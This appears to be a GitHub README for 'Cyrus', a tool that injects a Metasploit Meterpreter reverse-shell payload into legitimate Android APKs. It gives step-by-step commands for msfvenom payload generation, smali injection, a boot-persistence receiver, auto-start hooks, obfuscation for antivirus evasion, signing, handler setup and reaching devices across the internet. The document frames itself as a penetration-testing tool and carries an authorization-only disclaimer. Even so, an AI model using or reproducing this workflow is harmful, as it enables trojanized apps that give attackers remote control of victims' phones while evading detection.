## Cyrus The Virus — Android APK Payload Embedder

![Cyrus Demo](https://raw.githubusercontent.com/Clock-Skew/Cyrus/refs/heads/main/Con2.gif)

![Cyrus](https://img.shields.io/badge/Cyrus-The_Virus-blueviolet?style=for-the-badge) ![Android](https://img.shields.io/badge/Andro-Rat-green?style=for-the-badge) ![Metasploit](https://img.shields.io/badge/Meta-sploit-red?style=for-the-badge)

![Apktool](https://img.shields.io/badge/APK-Tool-orange?style=for-the-badge) ![Java](https://img.shields.io/badge/Java-Runtime-yellow?style=for-the-badge) ![Bash](https://img.shields.io/badge/Linux-UNIX-lightgrey?style=for-the-badge)

Cyrus is a focused, scriptable workflow for embedding a Metasploit Android Meterpreter payload into an existing APK. It automates the repeatable steps and leaves control in your hands: you select the APK, choose network parameters, review changes, and sign the final artifact.

> "You've proven to be a most useful mammal"

**An all-in-one tool for embedding reverse shell payloads into third party Android APKs. It’s designed for simplicity, versatility, and efficiency. By combining msfvenom (for payload generation), apktool (for APK decompilation and rebuilding), and intuitive automation, Cyrus allows penetration testers to focus on their tasks while it handles the technical intricacies of APK payload injection.**

## Disclaimer

- For ethical penetration testing and bug bounty work only.
- Use only with explicit, written authorization; unauthorized access is illegal.
- Provided AS IS, without warranty of any kind.
- The authors/maintainers assume no responsibility or liability for misuse or damages.


> Note: Cyrus does not sign APKs. You must sign `output/unsigned.apk` before installing on a device.

### What Cyrus Does

- Decompiles a host APK with apktool and exposes its manifest/smali.
- Generates an Android Meterpreter payload (`android/meterpreter/reverse_tcp`) via msfvenom.
- Injects the payload’s smali (com.metasploit.stage) into the host.
- Merges the payload’s permissions and inserts well‑formed service/receiver components.
- Attempts to auto‑start the payload service from the host launcher `onCreate()`.
- Optionally obfuscates the payload package by renaming `com.metasploit` → `com.<suffix>` (validated).
- Rebuilds the modified APK for signing and installation.
- Starts a Metasploit handler with your chosen LHOST/LPORT.

### Tools Cyrus Uses

- Apktool — decode/encode APKs and smali
- Metasploit Framework — `msfvenom` (payload), `msfconsole` (handler)
- Java Runtime — required by apktool
- Bash — orchestration and glue

## Requirements

- Linux (Kali/Debian/Ubuntu)
- Tools in PATH (Cyrus does not install system packages):
  - `apktool` (2.8.x tested)
  - `java` (OpenJDK 11+/17 recommended)
  - `msfvenom`, `msfconsole`

Verify:

```
apktool -version
java -version
msfvenom --version
msfconsole --version
```

## Tree

```
cyrus/
├── APPS/                      
├── modules/
│   ├── decompile.sh           
│   ├── generate_payload.sh    
│   ├── inject.sh              
│   ├── encode.sh              
│   ├── rebuild.sh             
│   ├── metasploit.sh          
│   └── cleanup.sh             
├── output/
│   ├── decompiled_apk/       
│   ├── payload.apk            
│   ├── payload_smali/        
│   └── unsigned.apk           # Final rebuild
└── cyrus.sh                   # Start
```

## Quick Start

1. Place a target APK under `cyrus/APPS/`.
2. From `cyrus/`, run `./cyrus.sh`.
3. Follow the menu in order:
   -  Decompile APK
   -  Generate Payload
   -  Inject Payload
   -  Obfuscate Payload (smali rename)
   -  Rebuild APK (Unsigned)
   -  Obfuscate APK with Obfuscapk
   -  Launch Metasploit
   -  Cleanup
4. Sign `output/unsigned.apk` and install on the device.
5. Launch the host app once (or reboot) to trigger the payload.

## Usage — Step by Step

### 1) Decompile APK
- Select an APK from `APPS/`. Cyrus decompiles to `output/decompiled_apk/` with XML manifest, making it safe to edit.

### 2) Generate Payload
- Creates `output/payload.apk` using:
  - `msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o output/payload.apk`
- Choose `LHOST` the device can reach (e.g., `192.168.1.10`) and a listening `LPORT`.

### 3) Inject Payload
- Decompiles `output/payload.apk` into `output/payload_smali/`.
- Copies `com/metasploit/stage/*` smali into the host (supports `smali` and `smali_classesN`).
- Merges `<uses-permission ... />` entries.
- Inserts well‑formed components under `<application>`:
  - `<service android:name="com.metasploit.stage.MainService" android:enabled="true" android:exported="false" />`
  - `<receiver android:name="com.metasploit.stage.MainBroadcastReceiver" android:enabled="true" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>`
- Attempts to auto‑start from the host launcher activity’s `onCreate()` (skips safely if structure is incompatible).

### 4) Obfuscate Payload (smali rename)
- Renames `com/metasploit/...` to `com/<suffix>/...` and updates smali/manifest references.
- Input is validated: `[a-z0-9_]`, lowercase, not starting with a digit.
- Example: `cyrus0x` → package `com.cyrus0x`.

### 5) Rebuild APK (Unsigned)
- Rebuilds to `output/unsigned.apk`. You must sign this before install.

### 6) Obfuscate APK with Obfuscapk
- Requires a local Obfuscapk setup (pre-configured under `~/Desktop/github-projects/Obfuscapk`).
- Wraps the Obfuscapk CLI in its Python venv and runs chosen obfuscators (e.g., `ClassRename,MethodRename,FieldRename,Rebuild`).
- Defaults to using `output/unsigned.apk` as input; otherwise, you can pick any APK.
- Produces `output/obfuscated.apk` and verifies signature/alignment.

### 7) Launch Metasploit
- Starts a handler with your parameters. Equivalent manual session:

```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit -j
```

### 8) Cleanup
- Resets `output/` to a clean baseline.

## Signing (External)

You must sign `output/unsigned.apk` before installing. Example approaches if tools exist on your host:

```
# apksigner with an existing debug keystore
apksigner sign --ks debug.keystore --ks-key-alias androiddebugkey \
  --ks-pass pass:android --key-pass pass:android output/unsigned.apk

# jarsigner (legacy approach)
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
  -keystore debug.keystore output/unsigned.apk androiddebugkey

# Verify
apksigner verify output/unsigned.apk
```

Cyrus does not generate keystores or install system tools.

## LHOST Tips

- Same LAN: use your host’s LAN IP (e.g., `192.168.1.10`) for both payload and handler.
- Bind‑all handler: `LHOST 0.0.0.0` is fine for the handler, but keep the payload’s `LHOST` as the device‑reachable address.
- Cross‑network: use a reachable public/VPN IP or DNS and configure port‑forwarding/NAT. Regenerate the payload if `LHOST` changes.

## Troubleshooting

- Build fails with smali errors like `Invalid text` referencing `com/com.<suffix>/...`
  - Cause: dotted or invalid obfuscation suffix.
  - Fix: Cleanup → Inject → Obfuscate with a safe suffix (e.g., `cyrus0x`).

- Build fails with XML error like `"receiver" must be terminated`.
  - Cause: malformed merges (older approaches).
  - Fix: Cyrus injects well‑formed service/receiver entries. Cleanup and repeat the flow.

- No session on handler
  - Verify device can reach `LHOST:LPORT`.
  - Open the host app at least once post‑install; or reboot.
  - Confirm handler payload/ports match the embedded payload.

- Apktool/Java anomalies
  - If you hit resource decode issues, Java 17 or 11 are widely compatible with apktool.

- Play Protect / AV
  - Use test devices/environments where protections won’t interfere.


## Remote/OTA Use (Port Forwarding)

You can run Cyrus handlers over the internet (OTA) by forwarding a TCP port from your router to your machine.

- Pick a public endpoint
  - Use your WAN IP (whatismyip) or a dynamic DNS hostname (e.g., DuckDNS/No-IP).
- Forward a port on your router
  - Create a TCP port-forward rule: `WAN:PORT -> LAN:<your-machine-IP>:PORT`.
  - Prefer a high, unprivileged port (e.g., 44444) to avoid ISP blocks on 25/80/443.
- Configure Cyrus/Metasploit
  - Set `LHOST` to your public IP/hostname.
  - Set `LPORT` to the forwarded port.
  - Ensure your local firewall allows inbound on `LPORT`.
- Verify connectivity
  - From a cellular network or another ISP: `nc -vz <public-host> <LPORT>` or use an external port-check service.
- NAT loopback
  - Some routers don’t support hairpin NAT; if testing from the same LAN, use your LAN IP instead of the public hostname.
- Security & ethics
  - Only test on devices/APKs you have explicit permission to assess.
  - Avoid well-known ports, enable rate limits where possible, and monitor for abuse.



## TODO

- Update antivirus evasion
- Add reverse HTTP/HTTPS payload options


## Credits & Inspirations

- Inspired by backdoor-apk by dana-at-cp: https://github.com/dana-at-cp/backdoor-apk
- Apktool by iBotPeaches and contributors
- Metasploit Framework by Rapid7 and the community
- Android reverse‑engineering community and tooling ecosystem
